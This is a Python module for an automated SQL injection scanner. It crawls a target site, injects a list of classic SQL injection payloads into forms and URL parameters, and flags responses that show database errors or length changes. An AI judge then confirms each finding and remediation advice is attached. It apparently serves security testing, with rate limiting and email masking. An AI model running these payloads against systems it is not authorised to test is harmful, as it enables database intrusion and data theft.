import re
import time
import requests
import urllib3
from urllib.parse import urlparse, parse_qs, urlencode
from concurrent.futures import ThreadPoolExecutor, as_completed
from crawler import crawl_target
from ai_engine import get_ai_recon, ai_judge_response, get_remediation

# Suppress InsecureRequestWarning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

REQUEST_TIMEOUT = 5
# Ethical rate limit: minimum delay between outgoing requests to a target.
# Prevents denial-of-service on probed servers (BCS Code of Conduct, Section 1).
REQUEST_DELAY = 0.5

# GDPR Article 5(1)(c) — data minimisation. Mask email addresses in findings
# so the existence of an exposure is reported without unnecessarily processing PII.
_EMAIL_RE = re.compile(r"\b([A-Za-z0-9._%+-])[A-Za-z0-9._%+-]*@([A-Za-z0-9.-]+\.[A-Za-z]{2,})\b")


def mask_emails(text):
    if not isinstance(text, str):
        return text
    return _EMAIL_RE.sub(lambda m: f"{m.group(1)}***@{m.group(2)}", text)


def _throttled_request(method, url, **kwargs):
    time.sleep(REQUEST_DELAY)
    if method == "post":
        return requests.post(url, **kwargs)
    return requests.get(url, **kwargs)

DEFAULT_PAYLOADS = [
    "'",
    "' OR '1'='1",
    "' OR 1=1--",
    '" OR "1"="1',
    "' UNION SELECT NULL--",
    "' AND 1=2--",
    "admin' --",
    "' OR 1=1#",
    "1' ORDER BY 1--",
    "' OR 'a'='a",
]

SQL_ERRORS = [
    # MySQL
    "sql syntax", "mysql_fetch", "Warning: mysql", "mysqli_fetch", "mysql_num_rows",
    # PostgreSQL
    "PostgreSQL", "pg_query", "pg_exec", "unterminated quoted string",
    # SQLite (used by OWASP Juice Shop)
    "sqlite3", "SQLITE_ERROR", "sqlite_error", "near \"",
    # Microsoft SQL Server
    "Microsoft OLE DB", "unclosed quotation mark", "mssql_query",
    # Oracle
    "ORA-01756", "ORA-00933", "oracle error",
    # Generic
    "syntax error", "SQLSTATE", "SQL error", "sql error",
    "JDBC", "database error", "db error",
    # ColdFusion / Java
    "SQLException", "java.sql",
    # Error indicators in JSON responses
    "SQLITE",
]


def check_sql_error(response_text):
    for error in SQL_ERRORS:
        if error.lower() in response_text.lower():
            return True
    return False


def check_response_length(original_len, test_text):
    """Detect significant response length differences indicating SQL injection."""
    diff = abs(original_len - len(test_text))
    return diff > 30  # Lowered threshold for better sensitivity on JSON APIs


class Scanner:
    def __init__(self, target_url):
        self.target_url = target_url
        self.findings = []
        self.logs = []
        self.tech_stack = "Unknown"
        self._baseline_len = 0

    def log(self, message, level="INFO"):
        self.logs.append(f"[{level}] {message}")

    def get_adaptive_payloads(self, field_name, context):
        """
        AI-lite payload generator. In a full implementation,
        this would call Gemini to generate a payload for a specific field.
        """
        payloads = list(DEFAULT_PAYLOADS)
        if "email" in field_name.lower():
            payloads.append("test@example.com' OR 1=1--")
        if "id" in field_name.lower():
            payloads.append("1' OR '1'='1")
        return payloads

    def test_endpoint(self, url, method, params, payload_map):
        """Tests a specific endpoint with payloads."""
        try:
            if method == 'get':
                r = _throttled_request('get', url, params=payload_map, timeout=REQUEST_TIMEOUT, verify=False)
            else:
                r = _throttled_request('post', url, data=payload_map, timeout=REQUEST_TIMEOUT, verify=False)

            error_detected = check_sql_error(r.text)
            length_changed = check_response_length(self._baseline_len, r.text) if self._baseline_len else False
            status_anomaly = r.status_code >= 500

            is_suspicious = error_detected or length_changed or status_anomaly

            if is_suspicious:
                self.log(f"Suspicious response from {url}. Triggering AI Judge...", "WARNING")
                judge_result = ai_judge_response(url, str(payload_map), r.text, r.status_code)

                if judge_result.get("vulnerable"):
                    finding = {
                        "type": "SQL Injection",
                        "url": url,
                        "payload": mask_emails(str(payload_map)),
                        "confidence": judge_result.get("confidence", 0),
                        "reason": mask_emails(judge_result.get("reason", "")),
                        "remediation": get_remediation("SQL Injection", self.tech_stack)
                    }
                    self.findings.append(finding)
                    self.log(f"Vulnerability CONFIRMED by AI: {judge_result['reason']}", "CRITICAL")
                    return True
            return False
        except Exception as e:
            self.log(f"Error testing {url}: {str(e)}", "ERROR")
            return False

    def run(self):
        self.log(f"Starting Intelligent Scan on {self.target_url}")

        # Capture baseline response length for diffing
        try:
            baseline = _throttled_request('get', self.target_url, timeout=REQUEST_TIMEOUT, verify=False)
            self._baseline_len = len(baseline.text)
        except Exception:
            self._baseline_len = 0

        # Phase 1: Recon
        self.log("Crawling target and performing AI Reconnaissance...")
        testable_elements, html = crawl_target(self.target_url)
        recon = get_ai_recon(html)
        self.tech_stack = recon.get("tech_stack", "Unknown")
        self.log(f"Tech Stack detected: {self.tech_stack}")

        # Phase 2: Scanning
        if not testable_elements:
            self.log("No forms found, testing URL parameters directly.")
            parsed = urlparse(self.target_url)
            params = parse_qs(parsed.query)
            for param in params:
                payloads = self.get_adaptive_payloads(param, self.tech_stack)
                for p in payloads:
                    test_params = params.copy()
                    test_params[param] = p
                    self.test_endpoint(self.target_url, 'get', params, test_params)
        else:
            for element in testable_elements:
                if element['type'] == 'form':
                    self.log(f"Testing form at {element['action']} ({element['method']})")
                    for input_field in element['inputs']:
                        name = input_field['name']
                        payloads = self.get_adaptive_payloads(name, self.tech_stack)
                        for p in payloads:
                            payload_map = {inp['name']: 'test' for inp in element['inputs']}
                            payload_map[name] = p
                            if self.test_endpoint(element['action'], element['method'], {}, payload_map):
                                break

        self.log("Scan complete.")
        return {
            "status": "Vulnerable" if self.findings else "Secure",
            "risk_level": "High" if self.findings else "Low",
            "tech_stack": self.tech_stack,
            "findings": self.findings,
            "details": self.logs
        }


def run_sqli_scan(url):
    scanner = Scanner(url)
    return scanner.run()
